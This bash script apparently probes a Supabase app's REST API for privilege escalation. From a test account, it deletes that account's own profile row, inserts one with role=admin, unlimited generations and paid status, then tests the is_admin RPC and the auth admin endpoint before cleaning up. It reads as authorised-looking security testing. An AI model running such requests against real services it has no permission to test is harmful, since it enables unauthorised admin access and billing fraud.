#!/bin/bash
# Hunt 4b (critical test): can a user DELETE their auto-created profile row and then
# INSERT a privileged one (role=admin / generations_left=9999), i.e. is the privileged-field
# trigger only attached to UPDATE and not INSERT?
# Only the throwaway second test account is touched; original row is re-created at the end.
source "$(dirname "$0")/env.sh"

TOKEN2="$(cat /tmp/token2.txt 2>/dev/null)"
USER2="$(cat /tmp/user2.txt 2>/dev/null)"
U1="23c8fb62-49c5-42d9-b031-906b97cd1cb4"
echo "token2 len=${#TOKEN2} user2=$USER2"
if [ -z "$TOKEN2" ] || [ -z "$USER2" ]; then echo "no second account; aborting"; exit 1; fi

echo "########## 1. Is self DELETE on profiles allowed? ##########"
req DELETE "$SUPA/rest/v1/profiles?user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Prefer: return=representation"

echo "########## 2. Confirm row gone ##########"
req GET "$SUPA/rest/v1/profiles?select=user_id,role&user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2"

echo "########## 3. INSERT privileged row for self (born admin attempt) ##########"
req POST "$SUPA/rest/v1/profiles" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d "{\"user_id\":\"$USER2\",\"role\":\"admin\",\"generations_left\":9999,\"activePlan\":\"PRO\",\"payment_status\":\"paid\",\"email\":\"<probe>@dropmail.me\"}"

echo "########## 4. Read back as user2 ##########"
req GET "$SUPA/rest/v1/profiles?select=user_id,role,generations_left,activePlan,payment_status&user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2"

echo "########## 5. is_admin RPC as user2 (does roles take effect?) ##########"
req POST "$SUPA/rest/v1/rpc/is_admin" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -d '{}'

echo "########## 6. Try to use admin role for something (auth admin API via direct CDN) ##########"
req GET "$SUPA/auth/v1/admin/users?per_page=1" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2"

echo "########## 7. Clean-up: delete test row, try re-insert a normal row ##########"
req DELETE "$SUPA/rest/v1/profiles?user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2"
req POST "$SUPA/rest/v1/profiles" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d "{\"user_id\":\"$USER2\",\"role\":\"user\",\"generations_left\":0,\"email\":\"<probe>@dropmail.me\"}"
echo "########## 8. Final state of user2 profile (should be role=user) ##########"
req GET "$SUPA/rest/v1/profiles?select=user_id,role,generations_left,activePlan&user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2"
